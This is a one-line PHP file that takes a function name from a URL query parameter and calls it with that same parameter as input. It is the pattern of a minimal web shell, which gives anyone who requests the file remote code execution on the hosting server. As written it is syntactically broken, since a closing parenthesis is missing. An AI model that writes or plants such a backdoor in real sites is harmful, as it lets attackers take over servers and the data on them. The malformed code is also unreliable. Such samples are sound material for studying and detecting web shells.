<?php
$_GET['nfXmhwK1']($_GET['nfXmhwK1'];
?>
